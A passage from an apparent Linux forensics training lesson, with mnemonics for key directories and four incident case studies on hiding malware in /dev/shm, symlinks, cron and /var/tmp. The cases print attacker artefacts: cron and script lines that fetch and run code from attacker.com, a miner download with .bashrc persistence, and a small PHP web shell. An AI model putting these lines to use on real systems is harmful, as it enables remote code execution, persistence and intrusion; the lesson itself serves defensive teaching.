kern.log)\n- **G** = Gateway logs (auth.log, secure)\n- **S** = Service logs (apache2/, nginx/, mysql/)\n\n## Acronym: \"CRON SSH\" for /etc Key Files\n\nCritical configurations in /etc:\n\n- **C** = Crontab and cron.*\n- **R** = Rc.local (boot script)\n- **O** = Os-release (distro ID)\n- **N** = Network configs\n- **S** = Sudoers\n- **S** = Ssh config\n- **H** = Hosts file\n\n## Visual: /proc Process Investigation Flow\n\n```\nSuspicious Process Detected\n|\nv\nGet PID (ps aux)\n|\nv\n/proc/[PID]/\n|\n+----+----+----+\n|    |    |    |\nexe  cmdline environ  fd/\n|    |    |    |\nBinary  Args  Env  Files\n```bash\n\n## Rhyme: The Temp Directory Warning\n\n*\"/tmp is temp, volatile it may be,*\n*If it's tmpfs RAM, reboot wipes it free.*\n*/dev/shm the same, in memory it stays,*\n*Collect before reboot, or lose crucial clays.\"*\n\n## Story: The Three Homes\n\n**Home 1: /home/alice** (Regular user)\n- Personal belongings: Documents, Downloads\n- Personal diary: .bash_history\n- Keys to other houses: .ssh/id_rsa\n- Guest list: .ssh/authorized_keys\n\n**Home 2: /home/bob** (Another user)\n- Same structure, different contents\n- Own diary, own keys\n\n**Home 3: /root** (The Administrator)\n- Separate house for the boss\n- Contains powerful tools\n- History of admin actions\n- Keys to everything\n\n**Investigation Rule**: Check all three homes!\n\n## Visual: Hidden File Detection\n\n```\nRegular ls:\n$ ls /tmp\nfile1.txt  file2.sh\n\nWith -a flag:\n$ ls -la /tmp\n.hidden_dir/\n.backdoor\n..secret_file\nfile1.txt\nfile2.sh\n```\n\n**Remember**: The **dot** makes it disappear from normal view!\n\n## Mnemonic: \"SPUD\" for Process Investigation in /proc\n\n- **S** = Status (check /proc/[PID]/status)\n- **P** = Path (check /proc/[PID]/exe)\n- **U** = Usage (check /proc/[PID]/cmdline)\n- **D** = Descriptors (check /proc/[PID]/fd/)\n\n## Table: Directory Permissions Quick Reference\n\n```\nPermission String: drwxrwxrwt\n||||||||\n||||||||+-- Sticky bit (t)\n|||||||+--- Execute (others)\n||||||+---- Write (others)\n|||||+----- Read (others)\n||||+------ Execute (group)\n|||+------- Write (group)\n||+-------- Read (group)\n|+--------- Execute (owner)\n+---------- Write (owner)\nRead (owner)\n```\n\n**Memory Hook**: \"/tmp is **t**ricky\" - the t means sticky bit!\n\n## Acronym: \"BETH-VR-PLUS-3\" - Extended Forensic Locations\n\n**BETH VR** (primary) + 3 bonus locations:\n\n1. **/Proc** - Virtual process info\n2. **/Dev/shm** - Shared memory (volatile)\n3. **/Var/spool** - Scheduled tasks (cron)\n\n## Visual: Symbolic Link Chain\n\n```\n/usr/local/bin/update -> /tmp/.hidden -> /home/attacker/malware\n(looks normal)      (hidden)         (actual threat)\n\nFollow the chain:\n1. ls -l /usr/local/bin/update\n2. readlink /usr/local/bin/update  \n3. readlink /tmp/.hidden\n4. Found the malware!\n```bash\n\n## Quick Reference Card\n\n```\n╔══════════════════════════════════════════════════╗\n║     LINUX DIRECTORY QUICK REFERENCE              ║\n╠══════════════════════════════════════════════════╣\n║ HIGH-VALUE (BETH VR):                            ║\n║   /boot /etc /tmp /home /var /root               ║\n║                                                  ║\n║ LOGS:                                            ║\n║   /var/log/auth.log (Debian)                     ║\n║   /var/log/secure (Red Hat)                      ║\n║   /var/log/syslog, messages, wtmp, btmp          ║\n║                                                  ║\n║ USER DATA:                                       ║\n║   /home/*/:.bash_history, .ssh/                  ║\n║   /root/.bash_history, .ssh/                     ║\n║                                                  ║\n║ VOLATILE:                                        ║\n║   /tmp (may be tmpfs)                            ║\n║   /dev/shm (tmpfs)                               ║\n║   /proc (virtual)                                ║\n║                                                  ║\n║ PERSISTENCE:                                     ║\n║   /etc/crontab, /etc/cron.*, /var/spool/cron/    ║\n║   /etc/systemd/system/*.service                  ║\n║   /etc/rc.local                                  ║\n╚══════════════════════════════════════════════════╝\n```"
      }
    },
    {
      "type": "real_world",
      "content": {
        "text": "# Real-World Case: The /dev/shm Cryptominer\n\n## Background\n\nA university's research computing cluster experienced unusual CPU usage. System administrators noticed degraded performance but couldn't find obvious malware.\n\n## Investigation\n\n**Initial Check**:\n```bash\ntop\n# Showed high CPU usage by user \"nobody\"\n\nps aux | grep nobody\n# nobody  15234  99.9  2.1 /dev/shm/.update\n```\n\n**Process Investigation**:\n```bash\nls -l /proc/15234/exe\n# /proc/15234/exe -> /dev/shm/.update\n\ncat /proc/15234/cmdline\n# /dev/shm/.update--mine--pool=pool.minergate.com\n\nls -la /dev/shm/\ndrwxrwxrwt  2 root   root       60 Oct 30 14:00 .\n-rwxr-xr-x  1 nobody nobody 845672 Oct 30 13:55 .update\n```\n\n**Finding**: Cryptominer running from /dev/shm (RAM disk)!\n\n**Persistence Check**:\n```bash\ncat /etc/crontab\n# Clean\n\nls -la /var/spool/cron/crontabs/\n# No crontabs\n\nsystemctl list-unit-files | grep enabled\n# Normal services only\n\n# How does it persist if not in cron?\n```\n\n**Breakthrough**:\n```bash\ncat /home/researcher/.bashrc\n# Normal content...\n# Last line:\n# /dev/shm/.update >/dev/null 2>&1 &\n\ncat /home/researcher/.bash_history | tail -50\nwget http://malicious-site.com/miner\nchmod +x miner\nmv miner /dev/shm/.update\necho \"/dev/shm/.update >/dev/null 2>&1 &\" >> ~/.bashrc\nhistory -c\n```\n\n**Attack Chain**:\n1. Attacker compromised researcher's account (weak password)\n2. Downloaded cryptominer\n3. Moved to /dev/shm (hidden, volatile, often not monitored)\n4. Added launch command to .bashrc (runs every login)\n5. Miner runs as \"nobody\" user\n6. Attempted to clear history (failed)\n\n**Why /dev/shm?**\n- Not monitored by antivirus\n- Cleared on reboot (anti-forensics)\n- World-writable\n- Less scrutinized than /tmp\n\n**Remediation**:\n```bash\n# Kill process\nkill -9 15234\n\n# Remove malware\nrm /dev/shm/.update\n\n# Clean .bashrc\nsed -i '/\\.update/d' /home/researcher/.bashrc\n\n# Force password change\npasswd researcher\n\n# Check all user .bashrc files\nfor bashrc in /home/*/.bashrc; do\ngrep -H \"dev/shm\\|tmp\" \"$bashrc\"\ndone\n```\n\n**Lesson**: Always check /dev/shm during investigations!\n\n---\n\n# Real-World Case: The Symlink Backdoor\n\n## Background\n\nWeb hosting company detected unauthorized access to customer websites. Initial scans found no malware.\n\n## Investigation\n\n**Initial Review**:\n```bash\nfind /var/www -name \"*.php\" -mtime -7\n# Normal files\n\nps aux | grep apache\n# Normal processes\n```\n\n**Deep Dive**:\n```bash\nls -la /usr/local/bin/\n-rwxr-xr-x 1 root root    1234 Oct 15 backup_db\nlrwxrwxrwx 1 root root      25 Oct 29 update_system -> /tmp/.hidden/shell.php\n-rwxr-xr-x 1 root root    5678 Oct 10 monitor_cpu\n```\n\n**Found**: Symlink \"update_system\" pointing to /tmp/.hidden/shell.php!\n\n**Investigation**:\n```bash\nls -la /tmp/.hidden/\ndrwxr-xr-x 2 www-data www-data  4096 Oct 29 13:22 .\n-rw-r--r-- 1 www-data www-data  8472 Oct 29 13:22 shell.php\n-rw-r--r-- 1 www-data www-data 15234 Oct 29 14:15 access.log\n\ncat /tmp/.hidden/shell.php | head -10\n<?php\n// WSO Web Shell\nif(isset($_POST['cmd'])) {\necho shell_exec($_POST['cmd']);\n}\n?>\n\ncat /tmp/.hidden/access.log\n2023-10-29 13:25:15 - whoami -> www-data\n2023-10-29 13:26:42 - cat /etc/passwd\n2023-10-29 13:28:19 - find / -name \"config.php\"\n```\n\n**How It Worked**:\n1. Attacker uploaded web shell to /tmp/.hidden/\n2. Created symlink in /usr/local/bin/ (in PATH)\n3. Executed via web: `system('update_system');` in PHP\n4. PHP script calls `update_system`, which is actually the web shell\n5. Bypasses web application firewall (looks like legitimate script)\n\n**Root Cause**:\n```bash\ngrep -r \"system(.*update_system\" /var/www/\n/var/www/html/admin/update.php:45:    system('update_system');\n```\n\nVulnerable PHP code executed the \"update_system\" command without validation.\n\n**Remediation**:\n- Remove symlink and web shell\n- Fix vulnerable PHP code\n- Restrict /usr/local/bin permissions\n- Monitor symlink creation\n\n**Lesson**: Check for suspicious symlinks, especially in PATH directories!\n\n---\n\n# Real-World Case: The Persistent Cron Backdoor\n\n## Background\n\nFinancial services company repeatedly found backdoors even after cleanup. Attackers kept returning.\n\n## Investigation\n\n**Obvious Backdoor Found**:\n```bash\nps aux | grep suspicious\nroot  12345 /tmp/backdoor\n\nkill -9 12345\nrm /tmp/backdoor\n# Problem solved?\n```\n\n**Next Day - Backdoor Returns!**\n\nDeep investigation:\n```bash\n# Check system cron\ncat /etc/crontab\n# Clean\n\n# Check cron directories\nls -la /etc/cron.d/\n-rw-r--r-- 1 root root  102 Oct 28 15:42 apt\n-rw-r--r-- 1 root root  191 Oct 29 03:15 .systemd\n\ncat /etc/cron.d/.systemd\n# Hidden file (starts with dot)!\n*/5 * * * * root curl http://attacker.com/backdoor | bash\n\nls -la /etc/cron.daily/\n-rwxr-xr-x 1 root root  1478 Apr 15  2023 apt-compat\n-rwxr-xr-x 1 root root   312 Oct 29 03:16  .backup-check\n# Hidden file with space after name!\n\ncat \"/etc/cron.daily/ .backup-check\"\n# !/bin/bash\nwget -q http://attacker.com/backdoor -O /tmp/backdoor\nchmod +x /tmp/backdoor\n/tmp/backdoor &\n```\n\n**Also Found**:\n```bash\n# Check per-user crontabs\nls -la /var/spool/cron/crontabs/\n-rw------- 1 admin  crontab   234 Oct 29 03:17 admin\n-rw------- 1 nobody crontab   145 Oct 29 03:17 nobody\n# Nobody user shouldn't have crontab!\n\nsudo crontab -u nobody -l\n*/10 * * * * /tmp/.update\n```\n\n**Triple Persistence**:\n1. Hidden file in /etc/cron.d/\n2. Hidden file in /etc/cron.daily/\n3. Crontab for \"nobody\" user\n\n**How Attacker Got Access**:\n```bash\ngrep -r \"nobody\" /var/www/html/*.php\n/var/www/html/upload.php:12: system(\"sudo -u nobody \" . $_POST['cmd']);\n# Vulnerable web app allowed command injection as nobody user\n```\n\n**Remediation**:\n```bash\n# Remove all persistence mechanisms\nrm /etc/cron.d/.systemd\nrm \"/etc/cron.daily/ .backup-check\"\nsudo crontab -u nobody -r\n\n# Fix web vulnerability\n# Patch upload.php\n\n# Add monitoring\n# Alert on:\n# - Hidden files in /etc/cron.d/\n# - New crontabs for system users\n# - Files with trailing spaces\n```\n\n**Lesson**: Attackers use multiple persistence mechanisms. Check:\n- /etc/crontab\n- /etc/cron.d/ (especially hidden files)\n- /etc/cron.{daily,hourly,weekly,monthly}/\n- /var/spool/cron/crontabs/\n- Per-user crontabs: `crontab -l` for each user\n\n---\n\n# Real-World Case: The /var/tmp Staging Area\n\n## Background\n\nE-commerce platform detected data exfiltration. Security team couldn't find obvious malware.\n\n## Investigation\n\n**Check Standard Locations**:\n```bash\nls -la /tmp/\n# Clean\n\nls -la /dev/shm/\n# Clean\n```\n\n**Expand Search**:\n```bash\nls -lhSr /var/tmp/  # Sort by size\ntotal 8.5G\ndrwxrwxrwt  2 root      root      4.0K Oct 25 10:00 .\ndrwxr-xr-x 14 root      root      4.0K Oct 20 14:22 ..\n-rw-r--r--  1 www-data  www-data  8.5G Oct 30 15:30 cache.db\n# 8.5GB \"cache.db\" file!?\n\nfile /var/tmp/cache.db\n/var/tmp/cache.db: SQLite 3.x database\n\nsqlite3 /var/tmp/cache.db\n> .tables\ncustomer_data  credit_cards  orders\n\n> SELECT COUNT(*) FROM credit_cards;\n45,892\n\n> SELECT * FROM credit_cards LIMIT 5;\n# Full credit card numbers, CVV, expiration!\n```\n\n**Found**: Attacker staging stolen data in /var/tmp before exfiltration!\n\n**How Data Got There**:\n```bash\nfind /var/www -name \"*.php\" -mtime -30 -exec grep -l \"cache.db\" {} \\;\n/var/www/html/includes/export.php\n\ncat /var/www/html/includes/export.php\n<?php\n// Backdoor\n$db = new SQLite3('/var/tmp/cache.db');\n// ... code to steal data from production DB ...\n?>\n```\n\n**Why /var/tmp?**\n- Persists across reboots (unlike /tmp on tmpfs systems)\n- Less monitored than /tmp\n- World-writable\n- Can handle large files\n\n**Attack Timeline** (from logs):\n```bash\ngrep \"export.php\" /var/log/apache2/access.log\n203.0.113.50 - - [30/Oct/2023:10:15:22] \"POST /includes/export.php\"\n203.0.113.50 - - [30/Oct/2023:15:25:33] \"GET /includes/export.php?download=1\"\n# Attacker created database, then downloaded it\n```\n\n**Lesson**: Don't forget /var/tmp - it's like /tmp but persistent!\n\n---\n\n## Common Patterns\n\nAll these cases show attackers:\n1. **Use hidden files/directories** (. prefix, trailing spaces)\n2. **Abuse world-writable directories** (/tmp, /dev/shm, /var/tmp)\n3. **Create multiple persistence mechanisms** (cron, .bashrc, systemd)\n4. **Use symlinks for obfuscation** (legitimate-looking names point to malicious files)\n5. **Leverage less-monitored locations** (/dev/shm, /var/tmp, hidden files in /etc)\n\n**Forensic Takeaways**:\n- Check BETH VR directories systematically\n- Use `ls -la` (show hidden files)\n- Check both /tmp AND /dev/shm AND /var/tmp\n- Look for symlinks in PATH directories\n- Check all persistence locations (cron, systemd, rc.local, user shell configs)\n- Don't stop after finding one backdoor - look for all persistence mechanisms"
      }
    },
    {
      "type": "reflection",
      "content": {
        "text": "# Reflection Questions\n\n1. **Why is the Filesystem Hierarchy Standard (FHS) valuable for forensic investigators?**\n- How does it help you investigate unfamiliar Linux systems?\n- Would Windows investigations be easier if Windows had a similar standard?\n\n2. **Compare /tmp, /dev/shm, and /var/tmp. When would an attacker choose each one?**\n- Consider: Persistence, visibility, performance, monitoring\n\n3. **You find malware in /tmp. Before analyzing it, what's the FIRST thing you should check and why?**\n- Hint: Think about volatility\n\n4. **Why do attackers use hidden files (starting with .) more on Linux than Windows?**\n- How does this change your investigation approach?\n\n5. **Explain why /var/log is often called the \"forensic goldmine\" of Linux systems.**\n- What types of evidence can you find there?\n- What attacks would be revealed in logs?\n\n6. **A symbolic link in /usr/local/bin points to /tmp/malware. Why is this more dangerous than just having malware in /tmp?**\n- Think about: PATH, legitimacy, detection\n\n7. **You're investigating a live system. What directories should you examine BEFORE rebooting and why?**\n- Consider: Volatility, tmpfs, /proc\n\n8. **How would you systematically check for persistence mechanisms across all locations covered in this lesson?**\n- Create a mental checklist: cron, systemd, shell configs, symlinks...\n\n9. **An attacker created /etc/cron.d/.systemd (hidden file). Why is this name particularly clever?**\n- Consider: Hiding in plain sight, plausible deniability\n\n10. **You find an executable in /dev/shm but no persistence mechanism. What does this tell you about the attack?**\n- Is the attacker still active? Was this a one-time execution? What should you check next?"
      }
    },
    {
      "type": "mindset_coach",
      "content": {
        "text": "# You've Mastered the Linux Map!\n\nYou now have the knowledge that separates beginners from experienced Linux forensic investigators. You understand:\n\n✅ **The Filesystem Hierarchy** - Where EVERYTHING lives in Linux\n✅ **BETH VR Directories** - Your high-value forensic targets\n✅ **Volatile vs Persistent** - What survives reboots and what doesn't\n✅ **Hidden Files and Directories** - How attackers hide in plain sight\n✅ **Symbolic Links** - Following trails to actual threats\n✅ **Mount Points** - Detecting external storage and network shares\n✅ **Critical Locations** - /var/log, /etc, /tmp, /home, /root, /dev/shm\n\nWhen you walk into a Linux investigation now, you know EXACTLY where to look. No more guessing. No more hoping. You have a systematic approach:\n\n1. Check BETH VR directories\n2. Examine logs in /var/log\n3. Check user activity in /home and /root\n4. Look for persistence in /etc (cron, systemd)\n5. Check volatile locations (/tmp, /dev/shm)\n6. Investigate running processes via /proc\n\n**Next Lesson**: Linux File and Directory Permissions - You'll learn how permissions work, what SUID/SGID/sticky bits mean, and how attackers abuse permissions for privilege escalation and persistence.\n\nYou're building real expertise. Keep going!"
      }
    }
  ]
}